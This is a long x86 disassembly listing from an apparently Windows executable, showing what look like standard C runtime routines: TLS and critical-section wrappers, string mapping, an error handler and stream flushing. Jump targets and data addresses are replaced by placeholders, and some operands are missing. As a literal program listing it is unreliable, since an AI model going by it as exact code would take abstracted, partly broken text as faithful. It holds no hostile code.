jb r-xdata
movzx eax si
sub eax 0x9e6
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xa66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x9e6
jmp r-xdata
mov eax 0xae6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xa66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xae6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xa66
jmp r-xdata
mov eax 0xb66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xae6
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xb66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xae6
jmp r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xb66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xb66
jmp r-xdata
mov eax 0xce6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xc66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xce6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xc66
jmp r-xdata
mov eax 0xd66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xce6
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xd66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xce6
jmp r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xd66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xd66
jmp r-xdata
mov eax 0xed0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xe50
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xed0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xe50
jmp r-xdata
mov eax 0xf20
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xed0
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xf20
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xed0
jmp r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xf20
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xf20
jmp r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x1040
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x1040
jmp r-xdata
mov eax 0x1810
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x17e0
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x1810
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x17e0
jmp r-xdata
movzx eax si
sub eax 0x1810
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x1810
jmp r-xdata
sub_412895
mov edi edi
push ebp
mov ebp esp
dec [ ecx ]
mov al [ ebp + 0x8 ]
mov ecx [ ecx ]
test al al
je r-xdata
pop ebp
retn 0x4
cmp [ ecx ] al
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
sub_4128bd
mov edi edi
push ebp
mov ebp esp
add [ ecx ] 0xfffffffe
mov ax [ ebp + 0x8 ]
mov ecx [ ecx ]
test ax ax
je r-xdata
pop ebp
retn 0x4
cmp [ ecx ] ax
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
sub_412904
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_417333
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
mov eax [ eax ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and eax [ ebp + 0xc ]
pop ebp
retn
sub_41292e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412904
mov eax [ ecx ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418514
jmp r-xdata
add esp 0xc
pop ebp
retn
sub_412961
mov edi edi
push esi
push edi
mov edi rw-data
xor esi esi
push 0x0
call sub_4129b9
pop ecx
xor al al
inc [ rw-data ]
add esi 0x18
add edi 0x18
cmp esi 0x138
jb r-xdata
push 0x0
push 0xfa0
push edi
call sub_412c73
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_4129b9
mov edi edi
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov al 0x1
pop esi
retn
imul eax esi 0x18
push edi
lea edi [ eax + rw-data ]
push edi
call [ DeleteCriticalSection@IAT ]
dec [ rw-data ]
sub edi 0x18
sub esi 0x1
jne r-xdata
pop edi
sub_412a01
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
mov edx [ rw-data ]
or edi 0xffffffff
mov ecx edx
mov esi edx
and ecx 0x1f
xor esi eax
ror esi cl
cmp esi edi
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x14 ]
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
push [ esi ]
call sub_412a9d
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax edx
push 0x20
and eax 0x1f
pop ecx
sub ecx eax
ror edi cl
xor edi edx
xchg [ ebx ] edi
push [ ebp + 0xc ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
add esi 0x4
cmp esi [ ebp + 0x14 ]
jne r-xdata
mov edx [ rw-data ]
push esi
call sub_40d5af
pop ecx
xchg [ ebx ] eax
jmp r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
sub_412a9d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push edi
lea edi [ eax * 4 + rw-data ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
push ebx
mov ebx [ eax * 4 + r--data ]
push esi
push 0x800
push 0x0
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
neg eax
sbb eax eax
and eax ecx
jmp r-xdata
mov eax esi
xchg [ edi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
pop edi
pop ebp
retn
mov eax esi
push esi
call [ FreeLibrary@IAT ]
xor esi esi
push esi
push esi
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
jmp r-xdata
or eax 0xffffffff
xchg [ edi ] eax
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
pop esi
pop ebx
sub_412b18
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x3
call sub_412a01
mov esi eax
add esp 0x10
test esi esi
je r-xdata
call [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
sub_412b6e
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x4
call sub_412a01
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsFree@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
sub_412bc4
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x5
call sub_412a01
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsGetValue@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
sub_412c1a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x6
call sub_412a01
add esp 0x10
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsSetValue@IAT ]
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x8
sub_412c73
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x14
call sub_412a01
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn 0xc
sub_412cd5
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x16
call sub_412a01
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_412d5d
push eax
call [ LCMapStringW@IAT ]
push [ ebp + 0x28 ]
mov ecx esi
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x24
sub_412d5d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
push r--data
push r--data
push 0x18
call sub_412a01
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call sub_4186a2
pop ecx
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ r--data ]
call esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x8
sub_412db9
mov eax [ rw-data ]
push edi
push 0x20
and eax 0x1f
mov edi rw-data
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
push 0x20
pop ecx
[ edi ]
mov al 0x1
pop edi
retn
sub_412ddf
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push esi
push r--data
push r--data
push r--data
push 0x8
call sub_412a01
mov esi eax
add esp 0x10
test esi esi
je r-xdata
xor eax eax
cmp ecx 0x1
sete al
jmp r-xdata
push 0x2
pop eax
mov ecx rw-data
xchg [ ecx ] eax
xor al al
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push 0x0
push eax
mov ecx esi
call [ r--data ]
call esi
cmp eax 0x7a
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
xor ecx ecx
mov edx rw-data
inc ecx
xchg [ edx ] ecx
mov al 0x1
jmp r-xdata
pop esi
sub_412e66
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
push esi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
cmp [ esi ] 0x0
je r-xdata
pop esi
and [ esi ] 0x0
push [ esi ]
call [ FreeLibrary@IAT ]
sub_412e9c
push 0x8
push r--data
call sub_40b2f0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x4 ]
mov eax [ eax ]
push [ eax ]
mov eax [ ecx ]
push [ eax ]
call sub_4131c3
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412ee0
call sub_40b336
retn 0xc
sub_412eec
push 0x8
push r--data
call sub_40b2f0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov ecx [ eax + 0x48 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412f41
call sub_40b336
retn 0xc
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
cmp ecx rw-data
je r-xdata
push ecx
call sub_411e2d
pop ecx
sub_412f4d
push 0x8
push r--data
call sub_40b2f0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax ]
call sub_4131c3
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412f8c
call sub_40b336
retn 0xc
sub_412f98
push 0x8
push r--data
call sub_40b2f0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
[ eax ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412fd4
call sub_40b336
retn 0xc
sub_412fe0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_412eec
mov esp ebp
pop ebp
retn
sub_413008
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_412e9c
mov esp ebp
pop ebp
retn
sub_413030
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_412f4d
mov esp ebp
pop ebp
retn
sub_413058
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_412f98
mov esp ebp
pop ebp
retn
sub_413080
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
inc ecx
push 0x43
mov [ eax + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x350 ] ecx
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax + 0x48 ] rw-data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] cx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x172 ] cx
mov eax [ ebp + 0x8 ]
and [ eax + 0x34c ] 0x0
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x5
call sub_413058
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
call sub_413008
add esp 0x10
mov esp ebp
pop ebp
retn
sub_4130f9
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
push [ ebp + 0x8 ]
call sub_41311a
push [ ebp + 0x8 ]
call sub_411e2d
pop ecx
pop ecx
sub_41311a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp ecx r--data
je r-xdata
push [ eax + 0x3c ]
call sub_411e2d
mov eax [ ebp + 0x8 ]
push [ eax + 0x30 ]
call sub_411e2d
mov eax [ ebp + 0x8 ]
push [ eax + 0x34 ]
call sub_411e2d
mov eax [ ebp + 0x8 ]
push [ eax + 0x38 ]
call sub_411e2d
mov eax [ ebp + 0x8 ]
push [ eax + 0x28 ]
call sub_411e2d
mov eax [ ebp + 0x8 ]
push [ eax + 0x2c ]
call sub_411e2d
mov eax [ ebp + 0x8 ]
push [ eax + 0x40 ]
call sub_411e2d
mov eax [ ebp + 0x8 ]
push [ eax + 0x44 ]
call sub_411e2d
mov eax [ ebp + 0x8 ]
push [ eax + 0x360 ]
call sub_411e2d
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x5
call sub_412fe0
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x4
call sub_413030
add esp 0x34
mov esp ebp
pop ebp
retn
push ecx
call sub_411e2d
mov eax [ ebp + 0x8 ]
pop ecx
sub_4131c3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov [ esi + 0x4c ] eax
pop esi
test eax eax
je r-xdata
push [ esi + 0x4c ]
call sub_417966
mov eax [ esi + 0x4c ]
pop ecx
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_41771d
pop ecx
cmp eax rw-data
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
push eax
call sub_41779a
pop ecx
sub_41320e
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
mov esi eax
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x364
push 0x1
call sub_411ef8
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
push eax
call sub_412bc4
mov edi eax
test edi edi
jne r-xdata
push edi
push [ rw-data ]
call sub_412c1a
test eax eax
jne r-xdata
push eax
push esi
call [ SetLastError@IAT ]
mov eax edi
pop edi
pop esi
retn
push rw-data
push edi
call sub_413080
push 0x0
call sub_411e2d
add esp 0xc
test edi edi
je r-xdata
push edi
jmp r-xdata
push esi
call [ SetLastError@IAT ]
call sub_411eb5
call sub_411e2d
pop ecx
jmp r-xdata
sub_413292
mov edi edi
push ebx
push esi
push edi
call [ GetLastError@IAT ]
mov esi eax
xor ebx ebx
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x364
push 0x1
call sub_411ef8
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
push eax
call sub_412bc4
mov edi eax
test edi edi
jne r-xdata
push edi
push [ rw-data ]
call sub_412c1a
test eax eax
jne r-xdata
push ebx
push esi
call [ SetLastError@IAT ]
mov ebx edi
push rw-data
push edi
call sub_413080
push ebx
call sub_411e2d
add esp 0xc
test edi edi
jne r-xdata
push edi
jmp r-xdata
push esi
call [ SetLastError@IAT ]
jmp r-xdata
call sub_411e2d
pop ecx
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn
sub_413317
push sub_4130f9
call sub_412b18
mov [ rw-data ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_413292
test eax eax
jne r-xdata
xor al al
retn
mov al 0x1
retn
push eax
call sub_413343
pop ecx
jmp r-xdata
sub_41335d
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
push 0x50
lea eax [ ebp - 0x320 ]
push 0x0
push eax
call sub_40be70
push 0x2cc
lea eax [ ebp - 0x2d0 ]
push 0x0
push eax
call sub_40be70
lea eax [ ebp - 0x320 ]
add esp 0x18
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_40b284
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40a8ab
mov esp ebp
pop ebp
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_40b284
pop ecx
sub_4134ac
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_413292
test eax eax
je r-xdata
push [ ebp + 0x18 ]
mov esi [ rw-data ]
mov ecx esi
push [ ebp + 0x14 ]
xor esi [ rw-data ]
and ecx 0x1f
push [ ebp + 0x10 ]
ror esi cl
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov esi [ eax + 0x35c ]
test esi esi
je r-xdata
mov ecx esi
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
add esp 0x14
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
call sub_413537
int3
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
sub_413537
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_41335d
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_41356a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_4135ad
mov edi edi
push ebp
mov ebp esp
push esi
call sub_4135d0
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_41356a
pop ecx
mov esi eax
call sub_4135e3
mov [ eax ] esi
pop esi
pop ebp
retn
sub_4135f6
push 0x10
push r--data
call sub_40b2f0
and [ ebp - 0x1c ] 0x0
push 0x8
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41368d
mov eax [ ebp - 0x1c ]
call sub_40b336
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
mov eax [ eax + 0xc ]
shr eax 0xd
test al 0x1
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_411e2d
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_40e6f2
pop ecx
cmp eax 0xffffffff
je r-xdata
inc [ ebp - 0x1c ]
sub_413696
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
lea esi [ ecx + 0xc ]
mov eax [ esi ]
and al 0x3
cmp al 0x2
je r-xdata
mov eax [ esi ]
test al 0xc0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
sub edi eax
mov [ ecx ] eax
and [ ecx + 0x8 ] 0x0
test edi edi
jle r-xdata
pop esi
pop ebp
retn
xor eax eax
push edi
push eax
push ecx
call sub_413c50
pop ecx
push eax
call sub_414206
add esp 0xc
cmp edi eax
je r-xdata
mov eax [ esi ]
shr eax 0x2
test al 0x1
je r-xdata
push 0x10
pop eax
[ esi ] eax
or eax 0xffffffff
jmp r-xdata
push 0xfffffffd
pop eax
[ esi ] eax
pop edi
sub_4136fc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_413696
pop ecx
test eax eax
je r-xdata
push esi
call sub_41374c
pop ecx
jmp r-xdata
mov eax [ esi + 0xc ]
shr eax 0xb
test al 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_413c50
push eax
call sub_41878e
pop ecx
pop ecx
test eax eax
jne r-xdata
sub_41374c
push 0x1c
push r--data
call sub_40b2f0
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x24 ] 0x0
push 0x8
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov eax [ rw-data ]
lea eax [ esi + eax * 4 ]
mov [ ebp - 0x2c ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41381b
cmp ebx 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov edi [ esi ]
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
call sub_40b336
retn
mov eax [ ebp - 0x24 ]
add esi 0x4
jmp r-xdata
push edi
call sub_40e654
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0xc ]
shr eax 0xd
test al 0x1
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4137f1
mov eax [ ebp - 0x2c ]
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push edi
call sub_4136fc
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ edi + 0xc ]
shr eax 0x1
test al 0x1
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push edi
call sub_4136fc
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_413824
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
lea edi [ esi + 0xc ]
mov eax [ edi ]
shr eax 0xd
test al 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ edi ]
shr eax 0x6
test al 0x1
je r-xdata
push [ esi + 0x4 ]
call sub_411e2d
pop ecx
mov eax 0xfffffebf
